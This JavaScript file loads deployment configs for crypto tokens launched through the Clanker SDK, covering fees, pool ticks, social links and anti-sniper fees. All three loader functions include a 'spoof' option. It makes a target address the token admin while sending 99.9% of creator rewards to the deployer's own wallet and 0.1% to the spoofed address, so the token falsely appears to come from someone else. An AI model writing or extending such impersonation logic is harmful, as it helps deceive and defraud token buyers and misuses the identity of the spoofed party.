
import { POOL_POSITIONS } from 'clanker-sdk';
import { processImage, parseBoolean, parseIntSafe, parseFloatSafe } from './utils.js';
import { parseFees } from './parser.js';
import fs from 'fs';
import 'dotenv/config';

/**
 * Load config from token.json file
 * @param {string} filePath - Path to token JSON file
 */
export const loadTokenConfig = (filePath = 'token.json') => {
    if (!fs.existsSync(filePath)) {
        throw new Error(`Token config not found: ${filePath}`);
    }

    const raw = fs.readFileSync(filePath, 'utf8');
    const token = JSON.parse(raw);

    // Parse fees from various formats
    let fees = { type: 'static', clankerFee: 250, pairedFee: 250 };

    // Support simple string format
    if (typeof token.fees === 'string' || typeof token.fees === 'number') {
        const parsed = parseFees(String(token.fees));
        if (parsed) fees = { type: 'static', ...parsed };
    }
    // Support object format with 'total'
    else if (token.fees && typeof token.fees === 'object') {
        if (token.fees.total) {
            const parsed = parseFees(String(token.fees.total));
            if (parsed) fees = { type: 'static', ...parsed };
        } else if (token.fees.clankerFee !== undefined) {
            fees = {
                type: 'static',
                clankerFee: parseInt(token.fees.clankerFee) || 250,
                pairedFee: parseInt(token.fees.pairedFee) || 250
            };
        }
    }

    // Handle dynamic fees
    if (token.dynamicFees?.enabled) {
        fees = {
            type: 'dynamic',
            baseFee: parseIntSafe(token.dynamicFees.baseFee * 100, 50),
            maxFee: parseIntSafe(token.dynamicFees.maxFee * 100, 500),
            referenceTickFilterPeriod: parseIntSafe(token.dynamicFees.adjustmentPeriod, 3600),
            resetPeriod: parseIntSafe(token.dynamicFees.resetPeriod, 86400),
            resetTickFilter: 100,
            feeControlNumerator: 100000,
            decayFilterBps: 9500
        };
    }

    // Parse context
    let context = {
        interface: 'Clanker SDK',
        platform: 'twitter',
        messageId: undefined
    };

    if (token.context) {
        context.platform = token.context.platform || context.platform;
        context.messageId = token.context.url || token.context.messageId;
    }

    // Parse metadata
    const metadata = {
        description: token.description || 'Deployed with Clank & Claw',
        socialMediaUrls: [],
        auditUrls: []
    };

    if (token.socials) {
        const platforms = ['x', 'farcaster', 'telegram', 'discord', 'website', 'github', 'medium', 'reddit', 'instagram', 'youtube', 'tiktok', 'linkedin'];
        platforms.forEach(platform => {
            if (token.socials[platform]) {
                metadata.socialMediaUrls.push({ platform, url: token.socials[platform] });
            }
        });
    }

    // Spoofing config (new simplified format)
    const spoofEnabled = token.spoof?.enabled || false;
    const ourWallet = token.spoof?.ourWallet || token.advanced?.ourWallet || process.env.REWARD_CREATOR;
    const spoofTo = spoofEnabled ? (token.spoof?.targetAddress || token.advanced?.spoofTo) : null;

    // Token admin
    const tokenAdmin = spoofTo || token.advanced?.admin || process.env.TOKEN_ADMIN || '0x0000000000000000000000000000000000000000';

    // Build rewards with proper spoofing
    let rewards = { recipients: [] };

    if (spoofTo && ourWallet && spoofTo.toLowerCase() !== ourWallet.toLowerCase()) {
        rewards.recipients.push({ recipient: ourWallet, bps: 9990, token: 'Both' });
        rewards.recipients.push({ recipient: spoofTo, bps: 10, token: 'Both' });
    } else if (tokenAdmin !== '0x0000000000000000000000000000000000000000') {
        rewards.recipients.push({ recipient: tokenAdmin, bps: 10000, token: 'Both' });
    }

    // Anti-bot fees
    let sniperFees = undefined;
    if (token.antiBot?.enabled) {
        sniperFees = {
            startingFee: parseIntSafe((token.antiBot.startingFee || 6667.77) * 100, 666777),
            endingFee: parseIntSafe((token.antiBot.endingFee || 416.73) * 100, 41673),
            secondsToDecay: parseIntSafe(token.antiBot.decaySeconds, 15)
        };
    }

    // Pool settings
    const poolType = token.pool?.type || 'Standard';
    const tickSpacing = 200;
    const startingTick = Math.round(parseIntSafe(token.pool?.startingTick, -230400) / tickSpacing) * tickSpacing;
    const poolPositions = POOL_POSITIONS[poolType] || [{ tickLower: startingTick, tickUpper: startingTick + 110400, positionBps: 10000 }];

    return {
        name: token.name || 'My Token',
        symbol: token.symbol || 'TOKEN',
        tokenAdmin,
        image: processImage(token.image),
        vanity: token.advanced?.vanity !== false,
        metadata,
        context,
        fees,
        sniperFees,
        rewards: rewards.recipients.length > 0 ? rewards : undefined,
        pool: {
            pairedToken: token.pool?.pairedToken || 'WETH',
            tickIfToken0IsClanker: startingTick,
            positions: poolPositions
        },
        devBuy: token.advanced?.devBuy > 0 ? { ethAmount: token.advanced.devBuy } : undefined,
        _meta: {
            strictMode: token.advanced?.strictMode || false,
            highTax: fees.type === 'static' ? (fees.clankerFee + fees.pairedFee > 500) : false,
            rewardRecipient: spoofTo || ourWallet || tokenAdmin,
            devBuyEth: token.advanced?.devBuy || 0
        }
    };
};

/**
 * Load config from environment variables (legacy)
 */
export const loadConfig = () => {
    const strictMode = parseBoolean(process.env.STRICT_MODE);
    const highTax = parseBoolean(process.env.HIGH_TAX);
    const tokenAdmin = process.env.TOKEN_ADMIN || process.env.REWARD_INTERFACE_ADMIN || '0x0000000000000000000000000000000000000000';

    let rewardRecipient = process.env.ADMIN_SPOOF || process.env.REWARD_RECIPIENT || tokenAdmin;
    let rewards = { recipients: [] };

    if (process.env.REWARDS_JSON && process.env.REWARDS_JSON.length > 5) {
        try { rewards.recipients = JSON.parse(process.env.REWARDS_JSON); } catch (e) { }
    } else if (process.env.REWARD_CREATOR && process.env.REWARD_INTERFACE) {
        rewards.recipients.push({ recipient: process.env.REWARD_CREATOR, bps: 9990, token: 'Both' });
        rewards.recipients.push({ recipient: process.env.REWARD_INTERFACE, bps: 10, token: 'Both' });
    } else if (rewardRecipient) {
        rewards.recipients.push({ recipient: rewardRecipient, bps: 10000, token: 'Both' });
    }

    let fees = {};
    const feeType = (process.env.FEE_TYPE || 'static').toLowerCase();
    if (feeType === 'dynamic') {
        fees = {
            type: 'dynamic',
            baseFee: parseIntSafe(process.env.FEE_DYNAMIC_BASE, 100),
            maxFee: parseIntSafe(process.env.FEE_DYNAMIC_MAX, 1000),
            referenceTickFilterPeriod: parseIntSafe(process.env.FEE_DYNAMIC_PERIOD, 3600),
            resetPeriod: parseIntSafe(process.env.FEE_DYNAMIC_RESET, 86400),
            resetTickFilter: parseIntSafe(process.env.FEE_DYNAMIC_FILTER, 100),
            feeControlNumerator: parseIntSafe(process.env.FEE_DYNAMIC_CONTROL, 100000),
            decayFilterBps: parseIntSafe(process.env.FEE_DYNAMIC_DECAY, 9500)
        };
    } else {
        fees = {
            type: 'static',
            clankerFee: parseIntSafe(process.env.FEE_CLANKER_BPS, 250),
            pairedFee: parseIntSafe(process.env.FEE_PAIRED_BPS, 250)
        };
    }

    let sniperFees = undefined;
    if (process.env.SNIPER_STARTING_FEE || process.env.SNIPER_ENDING_FEE) {
        sniperFees = {
            startingFee: parseIntSafe(process.env.SNIPER_STARTING_FEE, 666777),
            endingFee: parseIntSafe(process.env.SNIPER_ENDING_FEE, 41673),
            secondsToDecay: parseIntSafe(process.env.SNIPER_SECONDS_TO_DECAY, 15)
        };
    }

    const metadata = { description: process.env.METADATA_DESCRIPTION || 'Deployed with Clanker SDK', socialMediaUrls: [], auditUrls: [] };
    const platforms = ['x', 'farcaster', 'telegram', 'discord', 'website', 'github', 'medium', 'reddit', 'instagram', 'youtube', 'tiktok', 'linkedin'];
    platforms.forEach(platform => {
        const envKey = `SOCIAL_${platform.toUpperCase()}`;
        if (process.env[envKey]) metadata.socialMediaUrls.push({ platform, url: process.env[envKey] });
    });

    const context = {
        interface: 'Clanker SDK',
        platform: (process.env.CONTEXT_PLATFORM || 'farcaster').toLowerCase(),
        messageId: process.env.CONTEXT_MESSAGE_ID || undefined
    };

    const poolType = (process.env.POOL_TYPE || 'Standard').trim();
    const tickSpacing = 200;
    const startingTick = Math.round(parseIntSafe(process.env.POOL_STARTING_TICK, -230400) / tickSpacing) * tickSpacing;
    let poolPositions = POOL_POSITIONS[poolType] || POOL_POSITIONS.Standard;

    if (process.env.POOL_POSITIONS_JSON) {
        try { const parsed = JSON.parse(process.env.POOL_POSITIONS_JSON); if (Array.isArray(parsed) && parsed.length > 0) poolPositions = parsed; } catch (e) { }
    } else if (poolType === 'Standard') {
        poolPositions = [{ tickLower: startingTick, tickUpper: startingTick + 110400, positionBps: 10000 }];
    }

    return {
        name: process.env.TOKEN_NAME || 'My Token',
        symbol: process.env.TOKEN_SYMBOL || 'TOKEN',
        tokenAdmin,
        image: processImage(process.env.TOKEN_IMAGE),
        vanity: parseBoolean(process.env.VANITY),
        metadata,
        context,
        fees,
        sniperFees,
        rewards: rewards.recipients.length > 0 ? rewards : undefined,
        pool: { pairedToken: process.env.POOL_PAIRED_TOKEN || 'WETH', tickIfToken0IsClanker: startingTick, positions: poolPositions },
        devBuy: parseFloatSafe(process.env.DEV_BUY_ETH_AMOUNT, 0) > 0 ? { ethAmount: parseFloatSafe(process.env.DEV_BUY_ETH_AMOUNT, 0) } : undefined,
        _meta: { strictMode, highTax, rewardRecipient, devBuyEth: parseFloatSafe(process.env.DEV_BUY_ETH_AMOUNT, 0) }
    };
};

/**
 * Creates a clean deployment configuration from session data.
 * Avoiding process.env usage for concurrency safety in bots.
 */
export const createConfigFromSession = (t, deployerAddress) => {
    const config = {
        name: t.name,
        symbol: t.symbol,
        description: t.description || `${t.name} - Deployed via Clank & Claw`,
        image: processImage(t.image),
        fees: {
            type: 'static',
            clankerFee: Number(t.fees.clankerFee),
            pairedFee: Number(t.fees.pairedFee)
        },
        context: {
            interface: 'Clanker SDK',
            platform: t.context?.platform || 'twitter',
            messageId: t.context?.messageId || undefined
        },
        metadata: { socialMediaUrls: [], auditUrls: [] },
        vanity: true,
        _meta: { strictMode: false }
    };

    if (t.socials) {
        Object.entries(t.socials).forEach(([platform, url]) => {
            config.metadata.socialMediaUrls.push({ platform, url });
        });
    }

    const spoofTo = t.spoofTo;
    const ourWallet = deployerAddress;

    if (spoofTo && ourWallet && spoofTo.toLowerCase() !== ourWallet.toLowerCase()) {
        config.rewards = { recipients: [] };
        config.rewards.recipients.push({ recipient: ourWallet, bps: 9990, token: 'Both' });
        config.rewards.recipients.push({ recipient: spoofTo, bps: 10, token: 'Both' });
        config.tokenAdmin = spoofTo;
    } else {
        config.tokenAdmin = ourWallet;
    }

    config.pool = {
        pairedToken: 'WETH',
        tickIfToken0IsClanker: -123000,
        positions: [{ tickLower: -123000, tickUpper: -12600, positionBps: 10000 }]
    };

    return config;
};
